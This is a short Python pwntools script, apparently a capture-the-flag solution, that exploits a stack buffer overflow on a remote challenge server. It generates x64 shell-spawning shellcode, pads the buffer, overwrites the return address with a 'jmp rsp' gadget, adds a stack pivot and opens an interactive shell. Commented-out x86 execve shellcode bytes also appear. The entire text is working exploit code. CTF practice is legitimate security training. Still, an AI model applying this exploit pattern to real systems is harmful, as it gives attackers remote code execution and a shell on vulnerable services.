from pwn import *
context.log_level = 'DEBUG' 
p=remote('challenge.mini.lctf.online',10046)
context.arch='amd64'
context.os='linux'
context.endian    = 'little'

#shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
#shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
#shellcode_x86 += "\x0b\xcd\x80"
shellcode_x64 = asm(shellcraft.sh())
print(len(shellcode_x64))
sub_esp_jmp = asm('sub rsp, 0x40;jmp rsp')
#jmp_esp = 0x080484ee
#jmp_esp = 0x080484ee
jmp_esp=0x00000000004006ca
payload = shellcode_x64 + ( 0x30 - len(shellcode_x64)) * 'a' + 'bbbbbbbb' + p64(jmp_esp) + sub_esp_jmp
p.sendline(payload)
p.interactive()
